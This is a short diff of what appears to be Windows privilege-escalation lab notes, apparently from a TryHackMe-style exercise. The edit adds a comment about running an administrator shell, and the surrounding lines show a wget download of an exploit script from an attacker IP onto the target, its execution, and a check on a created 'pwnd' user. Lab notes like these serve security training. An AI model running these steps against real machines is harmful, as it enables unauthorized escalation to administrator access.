@@ -312,7 +312,7 @@ wget http://10.11.99.141:8000/49211.ps1 -O C:\Users\thm-unpriv\49211.ps1 # targe
 ./49211.ps1
 5️⃣ # Check Privilege pwnd user
 net user pwnd
-6️⃣ # 
+6️⃣ # As a last step, you can run a cmd or powershell as administrator (GUI)
 ```
 ## Credentials ✅
 ## File-Unattended ✅
